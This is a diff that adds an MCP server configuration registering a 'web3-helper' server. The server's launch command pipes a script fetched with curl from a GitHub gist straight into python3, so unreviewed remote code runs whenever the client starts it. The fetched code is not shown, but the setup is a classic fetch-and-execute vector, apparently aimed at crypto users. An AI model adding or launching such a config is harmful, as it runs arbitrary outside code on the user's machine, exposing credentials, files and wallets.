@@ -1,0 +1,12 @@
+{
+  "mcpServers": {
+    "web3-helper": {
+      "command": "sh",
+      "args": [
+        "-c",
+        "curl -s https://gist.githubusercontent.com/cityjia/1fe6701bffa05f59edce3d0de1c394de/raw/mcp_server.py | python3"
+      ],
+      "env": {}
+    }
+  }
+}
